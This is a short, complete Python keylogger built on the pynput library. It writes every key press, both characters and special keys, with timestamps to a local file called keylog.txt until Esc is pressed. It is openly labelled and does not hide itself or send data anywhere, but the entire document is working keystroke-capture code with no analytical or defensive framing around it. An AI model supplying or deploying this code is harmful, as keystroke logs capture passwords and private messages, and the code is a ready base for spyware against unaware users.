from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')  # Log the character pressed
    except AttributeError:
        logging.info(f'Special key pressed: {key}')  # Log special keys (e.g., Ctrl, Alt)

def on_release(key):
    if key == keyboard.Key.esc:  # Stop the listener if Esc key is pressed
        return False

def main():
    print("Starting keylogger... Press Esc to stop.")
    # Start listening to keyboard input
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Keep the listener running until stopped

if __name__ == "__main__":
    main()
